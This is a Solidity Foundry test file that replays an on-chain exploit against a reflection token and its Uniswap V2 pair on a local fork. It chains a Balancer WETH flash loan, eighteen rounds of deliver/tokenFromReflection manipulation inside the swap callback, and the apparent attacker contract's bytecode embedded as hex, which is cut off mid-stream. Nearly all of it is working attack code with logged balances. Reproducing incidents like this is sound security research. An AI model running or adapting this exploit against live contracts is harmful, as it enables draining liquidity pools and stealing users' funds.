// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

// https://explorer.phalcon.xyz/tx/eth/0x118b7b7c11f9e9bd630ea84ef267b183b34021b667f4a3061f048207d266437a
// https://etherscan.io/address/0x662D2dC484D65a3Ba4Da80E36EAa9a400AF0726B

interface I {
    function approve(address, uint256) external payable;
    function swapTokensForExactTokens(uint256, uint256, address[] memory, address, uint256) external payable;
    function token0() external payable returns (address);
    function skim(address) external payable;
    function reflectionFromToken(uint256, bool) external payable;
    function transfer(address, uint256) external payable;
    function flashLoan(address, address[] memory, uint256[] memory, bytes memory) external payable;
    function balanceOf(address) external payable returns (uint256);
    function totalSupply() external payable returns (uint256);
    function getReserves() external payable returns (uint112, uint112, uint32);
    function deliver(uint256) external payable;
    function tokenFromReflection(uint256) external payable;
    function swap(uint256, uint256, address, bytes memory) external payable;
}

contract Xecdb is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0x118b7b7c11f9e9bd630ea84ef267b183b34021b667f4a3061f048207d266437a");
    }

    address constant x30ac = 0x30Ac70e2dc5092f64031685bb23D50f782C27566;
    address constant x4b90 = 0x4b905B7dc722FB3780945e1568d3CaAcA2567f1B;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x7a25 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address constant xb1f4 = 0xb1F4b66104353eC63D8d59D3da42C0b4Fb06E7f3;
    address constant xba12 = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint256 t_uniswapV2Call = 0;

    function test1() public {
        vm.createSelectFork("http://localhost:18545", 17223595); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0x92ae4926b7bd1e64879655a485bc7cd360e5ebd75716d711ebc5487c8be516bd));

        // https://explorer.phalcon.xyz/tx/eth/0x92ae4926b7bd1e64879655a485bc7cd360e5ebd75716d711ebc5487c8be516bd
        this.x92ae4926();
        // https://explorer.phalcon.xyz/tx/eth/0xcef26f070d1488ad8875ebb7e508b916849429d2e78ab3164b4ff2f89b10662c
        this.xcef26f07();
        // https://explorer.phalcon.xyz/tx/eth/0xaac9cdcffbfe512aa9b35eea417950b459e18bcc96b646e0d2c40fc5e23c0647
        this.xaac9cdcf();
        // https://explorer.phalcon.xyz/tx/eth/0x118b7b7c11f9e9bd630ea84ef267b183b34021b667f4a3061f048207d266437a
        x7cfbfbfb();
    }

    function test2() public {
        vm.createSelectFork("http://localhost:18545", 17222867); // tx.blockNumber - 1
        // https://explorer.phalcon.xyz/tx/eth/0x92ae4926b7bd1e64879655a485bc7cd360e5ebd75716d711ebc5487c8be516bd
        this.x92ae4926();
        vm.warp(1683635015);
        vm.roll(17222867);
        // https://explorer.phalcon.xyz/tx/eth/0xcef26f070d1488ad8875ebb7e508b916849429d2e78ab3164b4ff2f89b10662c
        this.xcef26f07();
        vm.warp(1683639215);
        vm.roll(17223214);
        // https://explorer.phalcon.xyz/tx/eth/0xaac9cdcffbfe512aa9b35eea417950b459e18bcc96b646e0d2c40fc5e23c0647
        this.xaac9cdcf();
        vm.warp(1683643823);
        vm.roll(17223595);
        // https://explorer.phalcon.xyz/tx/eth/0x118b7b7c11f9e9bd630ea84ef267b183b34021b667f4a3061f048207d266437a
        x7cfbfbfb();
    }

    function test3() public {
        vm.createSelectFork("http://localhost:18545", 17223595); // tx.blockNumber - 1

        address RECEIVER = address(this);
        vm.warp(1683643823);
        vm.roll(17223596);
        // https://explorer.phalcon.xyz/tx/eth/0x118b7b7c11f9e9bd630ea84ef267b183b34021b667f4a3061f048207d266437a
        vm.deal(RECEIVER, 10 ether);
        {
            address token = address(0xb1F4b66104353eC63D8d59D3da42C0b4Fb06E7f3);
            uint256 target = 1000000000000000000000000;
            uint256 snap = vm.snapshotState();
            bool found = false;
            uint256 foundSlot = type(uint256).max;
            for (uint256 slot = 0; slot < 100; slot++) {
                vm.revertToState(snap);
                vm.store(token, keccak256(abi.encode(RECEIVER, uint256(slot))), bytes32(uint256(target)));
                uint256 bal = IERC20(token).balanceOf(RECEIVER);
                if (bal != target) continue;
                found = true;
                foundSlot = slot;
                break;
            }
            if (!found) {
                vm.revertToState(snap);
            } else {
                emit log_named_address("GF_SLOT_CACHE_TOKEN", token);
                emit log_named_uint("GF_SLOT_CACHE_SLOT", foundSlot);
                emit log_named_uint("GF_SLOT_CACHE_IS_VYPER", 0);
                vm.revertToState(snap);
                vm.store(token, keccak256(abi.encode(RECEIVER, uint256(foundSlot))), bytes32(uint256(target)));
                require(IERC20(token).balanceOf(RECEIVER) == target, "GF: final store failed");
            }
        }
        vm.store(
            address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2),
            keccak256(abi.encode(RECEIVER, uint256(3))),
            bytes32(uint256(1000000000000000000000000))
        );
        x7cfbfbfb();
    }

    function x92ae4926() public {
        address(tx.origin).call{value: 1000000000000000}("");
    }

    function xcef26f07() public {
        address(tx.origin).call{value: 1000000000000000}("");
    }

    function xaac9cdcf() public {
        _constructor_();
    }

    function x7cfbfbfb() public {
        address[] memory arr01 = new address[](1);
        arr01[0] = xc02a;
        uint256[] memory arr02 = new uint256[](1);
        arr02[0] = 20000000000000000000000;
        I(xba12).flashLoan(r, arr01, arr02, "");
    }

    function uniswapV2Call(address, uint256, uint256, bytes memory) public {
        t_uniswapV2Call++;

        if (t_uniswapV2Call == 1) {
            // uint112 v1 = 999851232331834046796;
            // uint112 v2 = 65545766156221572032;
            // uint32 v3 = 1633799856;
            (uint112 v1, uint112 v2, uint32 v3) = I(x30ac).getReserves();
            console2.log("I(x30ac).getReserves()\t->", v1, v2, v3);
            // uint256 v4 = 999999851780593628097;
            uint256 v4 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "999999851780593628097 (999.9998 ether)");
            // address v5 = xb1f4;
            address v5 = I(x30ac).token0();
            console2.log("I(x30ac).token0()\t->", v5);
            I(xc02a).transfer(x30ac, 4896672159875963);
            return;
        }
        if (t_uniswapV2Call == 2) {
            // uint256 v1 = 174228370272076056204;
            uint256 v1 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "174228370272076056204 (174.2283 ether)");
            I(xb1f4).tokenFromReflection(103181977612080040240185079558003026379480599321672644868319000000000000000);
            I(xb1f4).deliver(82241131470045106911);
            // uint112 v2 = 984917618957108871239;
            // uint112 v3 = 66669340955811629934;
            // uint32 v4 = 1683643823;
            (uint112 v2, uint112 v3, uint32 v4) = I(x30ac).getReserves();
            console2.log("I(x30ac).getReserves()\t->", v2, v3, v4);
            // uint256 v5 = 973955372609490296126;
            uint256 v5 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "973955372609490296126 (973.9553 ether)");
            // address v6 = xb1f4;
            address v6 = I(x30ac).token0();
            console2.log("I(x30ac).token0()\t->", v6);
            I(xc02a).transfer(x30ac, 771198294139712178);
            return;
        }
        if (t_uniswapV2Call == 3) {
            // uint256 v1 = 202384861432619944537;
            uint256 v1 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "202384861432619944537 (202.3848 ether)");
            I(xb1f4).tokenFromReflection(114616721388678540914766177868551377075702670764011038876479000000000000000);
            I(xb1f4).deliver(89797112409201051772);
            // uint112 v2 = 989963635814552566537;
            // uint112 v3 = 66431261300716059414;
            // uint32 v4 = 1683643823;
            (uint112 v2, uint112 v3, uint32 v4) = I(x30ac).getReserves();
            console2.log("I(x30ac).getReserves()\t->", v2, v3, v4);
            // uint256 v5 = 987640425827335474162;
            uint256 v5 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "987640425827335474162 (987.6404 ether)");
            // address v6 = xb1f4;
            address v6 = I(x30ac).token0();
            console2.log("I(x30ac).token0()\t->", v6);
            I(xc02a).transfer(x30ac, 176557022329527885);
            return;
        }
        if (t_uniswapV2Call == 4) {
            // uint256 v1 = 226113198335713026546;
            uint256 v1 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "226113198335713026546 (226.1131 ether)");
            I(xb1f4).tokenFromReflection(124909120935487064372995364451194467698465914188197616033519000000000000000);
            I(xb1f4).deliver(89797112409201051771);
            // uint112 v2 = 989954211663645252312;
            // uint112 v3 = 66530802885120266415;
            // uint32 v4 = 1683643823;
            (uint112 v2, uint112 v3, uint32 v4) = I(x30ac).getReserves();
            console2.log("I(x30ac).getReserves()\t->", v2, v3, v4);
            // uint256 v5 = 987629967341122560636;
            uint256 v5 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "987629967341122560636 (987.6299 ether)");
            // address v6 = xb1f4;
            address v6 = I(x30ac).token0();
            console2.log("I(x30ac).token0()\t->", v6);
            I(xc02a).transfer(x30ac, 176893148176277698);
            return;
        }
        if (t_uniswapV2Call == 5) {
            // uint256 v1 = 252475122151215274684;
            uint256 v1 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "252475122151215274684 (252.4751 ether)");
            I(xb1f4).tokenFromReflection(134173297772395288505227883381883345644104248591645999710079000000000000000);
            I(xb1f4).deliver(89797112409201051772);
            // uint112 v2 = 989943741534648894836;
            // uint112 v3 = 66630564295161166538;
            // uint32 v4 = 1683643823;
            (uint112 v2, uint112 v3, uint32 v4) = I(x30ac).getReserves();
            console2.log("I(x30ac).getReserves()\t->", v2, v3, v4);
            // uint256 v5 = 987618348076869178949;
            uint256 v5 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "987618348076869178949 (987.6183 ether)");
            // address v6 = xb1f4;
            address v6 = I(x30ac).token0();
            console2.log("I(x30ac).token0()\t->", v6);
            I(xc02a).transfer(x30ac, 177238030101225788);
            return;
        }
        if (t_uniswapV2Call == 6) {
            // uint256 v1 = 281762932337514298856;
            uint256 v1 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "281762932337514298856 (281.7629 ether)");
            I(xb1f4).tokenFromReflection(142511972546454128240325886781379080236558791072849158220799000000000000000);
            I(xb1f4).deliver(89797112409201051771);
            // uint112 v2 = 989932109335389937187;
            // uint112 v3 = 66730553929402402236;
            // uint32 v4 = 1683643823;
            (uint112 v2, uint112 v3, uint32 v4) = I(x30ac).getReserves();
            console2.log("I(x30ac).getReserves()\t->", v2, v3, v4);
            // uint256 v5 = 987605439200857733390;
            uint256 v5 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "987605439200857733390 (987.6054 ether)");
            // address v6 = xb1f4;
            address v6 = I(x30ac).token0();
            console2.log("I(x30ac).token0()\t->", v6);
            I(xc02a).transfer(x30ac, 177592611891180342);
            return;
        }
        if (t_uniswapV2Call == 7) {
            // uint256 v1 = 314301370408724486484;
            uint256 v1 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "314301370408724486484 (314.3013 ether)");
            I(xb1f4).tokenFromReflection(150017603992359361206758285706891950560748552233273316419119000000000000000);
            I(xb1f4).deliver(89797112409201051772);
            // uint112 v2 = 989919186088728203782;
            // uint112 v3 = 66830781108880634934;
            // uint32 v4 = 1683643823;
            (uint112 v2, uint112 v3, uint32 v4) = I(x30ac).getReserves();
            console2.log("I(x30ac).getReserves()\t->", v2, v3, v4);
            // uint256 v5 = 987591097580231420869;
            uint256 v5 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "987591097580231420869 (987.5910 ether)");
            // address v6 = xb1f4;
            address v6 = I(x30ac).token0();
            console2.log("I(x30ac).token0()\t->", v6);
            I(xc02a).transfer(x30ac, 177957943771865907);
            return;
        }
        if (t_uniswapV2Call == 8) {
            // uint256 v1 = 350451220649466239842;
            uint256 v1 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "350451220649466239842 (350.4512 ether)");
            I(xb1f4).tokenFromReflection(156773414109455549084046337993880338627845499466198544256639000000000000000);
            I(xb1f4).deliver(89797112409201051771);
            // uint112 v2 = 989904828502465967653;
            // uint112 v3 = 66931256181168424120;
            // uint32 v4 = 1683643823;
            (uint112 v2, uint112 v3, uint32 v4) = I(x30ac).getReserves();
            console2.log("I(x30ac).getReserves()\t->", v2, v3, v4);
            // uint256 v5 = 987575164195945546072;
            uint256 v5 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "987575164195945546072 (987.5751 ether)");
            // address v6 = xb1f4;
            address v6 = I(x30ac).token0();
            console2.log("I(x30ac).token0()\t->", v6);
            I(xc02a).transfer(x30ac, 178335194442880696);
            return;
        }
        if (t_uniswapV2Call == 9) {
            // uint256 v1 = 390613310469761444290;
            uint256 v1 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "390613310469761444290 (390.6133 ether)");
            I(xb1f4).tokenFromReflection(162854310922362484923816057236675042362322725124208342858479000000000000000);
            I(xb1f4).deliver(89797112409201051772);
            // uint112 v2 = 989888877380532502844;
            // uint112 v3 = 67031990636203650742;
            // uint32 v4 = 1683643823;
            (uint112 v2, uint112 v3, uint32 v4) = I(x30ac).getReserves();
            console2.log("I(x30ac).getReserves()\t->", v2, v3, v4);
            // uint256 v5 = 987557462379573721089;
            uint256 v5 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "987557462379573721089 (987.5574 ether)");
            // address v6 = xb1f4;
            address v6 = I(x30ac).token0();
            console2.log("I(x30ac).token0()\t->", v6);
            I(xc02a).transfer(x30ac, 178725664479049387);
            return;
        }
        if (t_uniswapV2Call == 10) {
            // uint256 v1 = 435232954755744602943;
            uint256 v1 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "435232954755744602943 (435.2329 ether)");
            I(xb1f4).tokenFromReflection(168327719056739636238931012199376724504126008411366521270479000000000000000);
            I(xb1f4).deliver(89797112409201051772);
            // uint112 v2 = 989871155857827429820;
            // uint112 v3 = 67132997235221453975;
            // uint32 v4 = 1683643823;
            (uint112 v2, uint112 v3, uint32 v4) = I(x30ac).getReserves();
            console2.log("I(x30ac).getReserves()\t->", v2, v3, v4);
            // uint256 v5 = 987537795854418760462;
            uint256 v5 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "987537795854418760462 (987.5377 ether)");
            // address v6 = xb1f4;
            address v6 = I(x30ac).token0();
            console2.log("I(x30ac).token0()\t->", v6);
            I(xc02a).transfer(x30ac, 179130801254626720);
            return;
        }
        if (t_uniswapV2Call == 11) {
            // uint256 v1 = 484804893494888523397;
            uint256 v1 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "484804893494888523397 (484.8048 ether)");
            I(xb1f4).tokenFromReflection(173254327339563734009156536426316040666114394328896467066959000000000000000);
            I(xb1f4).deliver(89797112409201051771);
            // uint112 v2 = 989851467439150900892;
            // uint112 v3 = 67234290154277633063;
            // uint32 v4 = 1683643823;
            (uint112 v2, uint112 v3, uint32 v4) = I(x30ac).getReserves();
            console2.log("I(x30ac).getReserves()\t->", v2, v3, v4);
            // uint256 v5 = 987515946559208224701;
            uint256 v5 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "987515946559208224701 (987.5159 ether)");
            // address v6 = xb1f4;
            address v6 = I(x30ac).token0();
            console2.log("I(x30ac).token0()\t->", v6);
            I(xc02a).transfer(x30ac, 179552215565032184);
            return;
        }
        if (t_uniswapV2Call == 12) {
            // uint256 v1 = 539878777423842202560;
            uint256 v1 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "539878777423842202560 (539.8787 ether)");
            I(xb1f4).tokenFromReflection(177688761713267347277622900908051072622375453884248186128319000000000000000);
            I(xb1f4).deliver(89797112409201051772);
            // uint112 v2 = 989829593820476399086;
            // uint112 v3 = 67335885144023271716;
            // uint32 v4 = 1683643823;
            (uint112 v2, uint112 v3, uint32 v4) = I(x30ac).getReserves();
            console2.log("I(x30ac).getReserves()\t->", v2, v3, v4);
            // uint256 v5 = 987491672230243876620;
            uint256 v5 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "987491672230243876620 (987.4916 ether)");
            // address v6 = xb1f4;
            address v6 = I(x30ac).token0();
            console2.log("I(x30ac).token0()\t->", v6);
            I(xc02a).transfer(x30ac, 179991700141216613);
            return;
        }
        if (t_uniswapV2Call == 13) {
            // uint256 v1 = 601065262523420997822;
            uint256 v1 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "601065262523420997822 (601.6526 ether)");
            I(xb1f4).tokenFromReflection(181680190924970773091428630963597315641519164683769968695119000000000000000);
            I(xb1f4).deliver(89797112409201051772);
            // uint112 v2 = 989805292468408551558;
            // uint112 v3 = 67437799707581119090;
            // uint32 v4 = 1683643823;
            (uint112 v2, uint112 v3, uint32 v4) = I(x30ac).getReserves();
            console2.log("I(x30ac).getReserves()\t->", v2, v3, v4);
            // uint256 v5 = 987464703715196066090;
            uint256 v5 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "987464703715196066090 (987.4647 ether)");
            // address v6 = xb1f4;
            address v6 = I(x30ac).token0();
            console2.log("I(x30ac).token0()\t->", v6);
            I(xc02a).transfer(x30ac, 180451250274658689);
            return;
        }
        if (t_uniswapV2Call == 14) {
            // uint256 v1 = 669042780936150532534;
            uint256 v1 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "669042780936150532534 (669.4278 ether)");
            I(xb1f4).tokenFromReflection(185272871706653766178792970655516187655469975388689834193199000000000000000);
            I(xb1f4).deliver(89797112409201051772);
            // uint112 v2 = 989778293930987128405;
            // uint112 v3 = 67540053298587431628;
            // uint32 v4 = 1683643823;
            (uint112 v2, uint112 v3, uint32 v4) = I(x30ac).getReserves();
            console2.log("I(x30ac).getReserves()\t->", v2, v3, v4);
            // uint256 v5 = 987434741988758553602;
            uint256 v5 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "987434741988758553602 (987.4347 ether)");
            // address v6 = xb1f4;
            address v6 = I(x30ac).token0();
            console2.log("I(x30ac).token0()\t->", v6);
            I(xc02a).transfer(x30ac, 180933086796684253);
            return;
        }
        if (t_uniswapV2Call == 15) {
            // uint256 v1 = 744565063381899214108;
            uint256 v1 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "744565063381899214108 (744.5650 ether)");
            I(xb1f4).tokenFromReflection(188506639491192738052100693174057028888901061064425446575439000000000000000);
            I(xb1f4).deliver(89797112409201051771);
            // uint112 v2 = 989748298850019580004;
            // uint112 v3 = 67642667541701281048;
            // uint32 v4 = 1683643823;
            (uint112 v2, uint112 v3, uint32 v4) = I(x30ac).getReserves();
            console2.log("I(x30ac).getReserves()\t->", v2, v3, v4);
            // uint256 v5 = 987401454837073529107;
            uint256 v5 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "987401454837073529107 (987.4014 ether)");
            // address v6 = xb1f4;
            address v6 = I(x30ac).token0();
            console2.log("I(x30ac).token0()\t->", v6);
            I(xc02a).transfer(x30ac, 181439681684660951);
            return;
        }
        if (t_uniswapV2Call == 16) {
            // uint256 v1 = 828469496479700781796;
            uint256 v1 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "828469496479700781796 (828.4694 ether)");
            I(xb1f4).tokenFromReflection(191417350105293939822167481601233305058698711729128014671439000000000000000);
            I(xb1f4).deliver(89797112409201051772);
            // uint112 v2 = 989714974641815032051;
            // uint112 v3 = 67745666478149861917;
            // uint32 v4 = 1683643823;
            (uint112 v2, uint112 v3, uint32 v4) = I(x30ac).getReserves();
            console2.log("I(x30ac).getReserves()\t->", v2, v3, v4);
            // uint256 v5 = 987364473174163926045;
            uint256 v5 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "987364473174163926045 (987.3644 ether)");
            // address v6 = xb1f4;
            address v6 = I(x30ac).token0();
            console2.log("I(x30ac).token0()\t->", v6);
            I(xc02a).transfer(x30ac, 181973786600066133);
            return;
        }
        if (t_uniswapV2Call == 17) {
            // uint256 v1 = 921686407641258955126;
            uint256 v1 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "921686407641258955126 (921.6864 ether)");
            I(xb1f4).tokenFromReflection(194037277336787853437298827419664653506784206765267832037359000000000000000);
            I(xb1f4).deliver(89797112409201051771);
            // uint112 v2 = 989677951809515912369;
            // uint112 v3 = 67849076839176596079;
            // uint32 v4 = 1683643823;
            (uint112 v2, uint112 v3, uint32 v4) = I(x30ac).getReserves();
            console2.log("I(x30ac).getReserves()\t->", v2, v3, v4);
            // uint256 v5 = 987323386949529849054;
            uint256 v5 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "987323386949529849054 (987.3233 ether)");
            // address v6 = xb1f4;
            address v6 = I(x30ac).token0();
            console2.log("I(x30ac).token0()\t->", v6);
            I(xc02a).transfer(x30ac, 182538464699940714);
            return;
        }
        if (t_uniswapV2Call == 18) {
            // uint256 v1 = 999452075099173320332;
            uint256 v1 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "999452075099173320332 (999.4520 ether)");
            I(xb1f4).tokenFromReflection(195853551219815135636789710315818132373510833258272089681961400000000000000);
            I(xb1f4).deliver(68981521694072044936);
            // uint112 v2 = 991943285221007288964;
            // uint112 v3 = 67777048420988065936;
            // uint32 v4 = 1683643823;
            (uint112 v2, uint112 v3, uint32 v4) = I(x30ac).getReserves();
            console2.log("I(x30ac).getReserves()\t->", v2, v3, v4);
            // uint256 v5 = 990359523395705968725;
            uint256 v5 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "990359523395705968725 (990.3595 ether)");
            // address v6 = xb1f4;
            address v6 = I(x30ac).token0();
            console2.log("I(x30ac).token0()\t->", v6);
            I(xc02a).transfer(x30ac, 124272473291704534);
            return;
        }
    }

    function _constructor_() public {
        bytes memory rt = abi.encodePacked(
            hex"608060405234801561001057600080fd5b50600436106100a95760003560e01c",
            hex"80637cfbfbfb116100715780637cfbfbfb1461013e5780638da5cb5b1461015a",
            hex"578063a0c3b78a14610178578063edae876f14610196578063f04f2707146101",
            hex"b4578063f887ea40146101d0576100a9565b806310d1e85c146100ae57806319",
            hex"89b58b146100ca5780634707d000146100e85780634d20d26714610104578063",
            hex"690d832014610122575b600080fd5b6100c860048036038101906100c3919061",
            hex"321c565b6101ee565b005b6100d2610835565b6040516100df91906132b3565b",
            hex"60405180910390f35b61010260048036038101906100fd91906132ce565b6108",
            hex"5b565b005b61010c6109f2565b60405161011991906132b3565b604051809103",
            hex"90f35b61013c6004803603810190610137919061330e565b610a18565b005b61",
            hex"01586004803603810190610153919061333b565b610b14565b005b610162610e",
            hex"3f565b60405161016f91906132b3565b60405180910390f35b610180610e6856",
            hex"5b60405161018d91906132b3565b60405180910390f35b61019e610e8e565b60",
            hex"40516101ab91906132b3565b60405180910390f35b6101ce6004803603810190",
            hex"6101c99190613693565b610eb4565b005b6101d8611154565b6040516101e591",
            hex"906137c9565b60405180910390f35b600082828101906101ff919061381c565b",
            hex"9050806103e6576000600560009054906101000a900473ffffffffffffffffff",
            hex"ffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffff",
            hex"ff166370a08231306040518263ffffffff1660e01b8152600401610263919061",
            hex"32b3565b602060405180830381865afa158015610280573d6000803e3d6000fd",
            hex"5b505050506040513d601f19601f820116820180604052508101906102a49190",
            hex"61385e565b90506000600560009054906101000a900473ffffffffffffffffff",
            hex"ffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffff",
            hex"ff16632d8381196004546040518263ffffffff1660e01b815260040161030591",
            hex"9061389a565b602060405180830381865afa158015610322573d6000803e3d60",
            hex"00fd5b505050506040513d601f19601f82011682018060405250810190610346",
            hex"919061385e565b9050808261035491906138e4565b9150600560009054906101",
            hex"000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffff",
            hex"ffffffffffffffffffffffffffffff16633bd5d173836040518263ffffffff16",
            hex"60e01b81526004016103b1919061389a565b600060405180830381600087803b",
            hex"1580156103cb57600080fd5b505af11580156103df573d6000803e3d6000fd5b",
            hex"5050505050505b6000806000600660009054906101000a900473ffffffffffff",
            hex"ffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffff",
            hex"ffffffff16630902f1ac6040518163ffffffff1660e01b815260040160606040",
            hex"5180830381865afa158015610458573d6000803e3d6000fd5b50505050604051",
            hex"3d601f19601f8201168201806040525081019061047c919061399a565b826dff",
            hex"ffffffffffffffffffffffffff169250816dffffffffffffffffffffffffffff",
            hex"1691505080935081945050506000600560009054906101000a900473ffffffff",
            hex"ffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffff",
            hex"ffffffffffff166370a08231600660009054906101000a900473ffffffffffff",
            hex"ffffffffffffffffffffffffffff166040518263ffffffff1660e01b81526004",
            hex"0161052a91906132b3565b602060405180830381865afa158015610547573d60",
            hex"00803e3d6000fd5b505050506040513d601f19601f8201168201806040525081",
            hex"019061056b919061385e565b9050600260009054906101000a900473ffffffff",
            hex"ffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffff",
            hex"ffffffffffff16600660009054906101000a900473ffffffffffffffffffffff",
            hex"ffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16",
            hex"630dfe16816040518163ffffffff1660e01b8152600401602060405180830381",
            hex"865afa158015610613573d6000803e3d6000fd5b505050506040513d601f1960",
            hex"1f820116820180604052508101906106379190613a02565b73ffffffffffffff",
            hex"ffffffffffffffffffffffffff16036106de5760016103e56103e88661066591",
            hex"90613a2f565b60038b8761067391906138e4565b61067d9190613a2f565b6103",
            hex"e58561068b9190613a2f565b6106959190613a71565b620f424087896106a591",
            hex"90613a2f565b6106af9190613a2f565b6106b99190613ad4565b6106c3919061",
            hex"38e4565b6106cd9190613ad4565b6106d79190613a71565b9150610766565b60",
            hex"016103e56103e8856106f19190613a2f565b60038c886106ff91906138e4565b",
            hex"6107099190613a2f565b6103e5856107179190613a2f565b6107219190613a71",
            hex"565b620f424087896107319190613a2f565b61073b9190613a2f565b61074591",
            hex"90613ad4565b61074f91906138e4565b6107599190613ad4565b610763919061",
            hex"3a71565b91505b600260009054906101000a900473ffffffffffffffffffffff",
            hex"ffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16",
            hex"63a9059cbb600660009054906101000a900473ffffffffffffffffffffffffff",
            hex"ffffffffffffff16846040518363ffffffff1660e01b81526004016107e59291",
            hex"90613b05565b6020604051808303816000875af1158015610804573d6000803e",
            hex"3d6000fd5b505050506040513d601f19601f8201168201806040525081019061",
            hex"08289190613b43565b5050505050505050505050565b60076000905490610100",
            hex"0a900473ffffffffffffffffffffffffffffffffffffffff1681565b61086361",
            hex"1178565b73ffffffffffffffffffffffffffffffffffffffff16600080549061",
            hex"01000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffff",
            hex"ffffffffffffffffffffffffffffffff16146108f0576040517f08c379a00000",
            hex"0000000000000000000000000000000000000000000000000000815260040161",
            hex"08e790613bcd565b60405180910390fd5b60008273ffffffffffffffffffffff",
            hex"ffffffffffffffffff166370a08231306040518263ffffffff1660e01b815260",
            hex"040161092b91906132b3565b602060405180830381865afa158015610948573d",
            hex"6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250",
            hex"81019061096c919061385e565b90508273ffffffffffffffffffffffffffffff",
            hex"ffffffffff1663a9059cbb83836040518363ffffffff1660e01b815260040161",
            hex"09a9929190613b05565b6020604051808303816000875af11580156109c8573d",
            hex"6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250",
            hex"8101906109ec9190613b43565b50505050565b600560009054906101000a9004",
            hex"73ffffffffffffffffffffffffffffffffffffffff1681565b610a2061117856",
            hex"5b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a",
            hex"900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffff",
            hex"ffffffffffffffffffffffffff1614610aad576040517f08c379a00000000000",
            hex"00000000000000000000000000000000000000000000008152600401610aa490",
            hex"613bcd565b60405180910390fd5b60003073ffffffffffffffffffffffffffff",
            hex"ffffffffffff163190508173ffffffffffffffffffffffffffffffffffffffff",
            hex"166108fc829081150290604051600060405180830381858888f1935050505015",
            hex"8015610b0f573d6000803e3d6000fd5b505050565b610b1c611178565b73ffff",
            hex"ffffffffffffffffffffffffffffffffffff1660008054906101000a900473ff",
            hex"ffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffff",
            hex"ffffffffffffffffff1614610ba9576040517f08c379a0000000000000000000",
            hex"000000000000000000000000000000000000008152600401610ba090613bcd56",
            hex"5b60405180910390fd5b82600560006101000a81548173ffffffffffffffffff",
            hex"ffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffff",
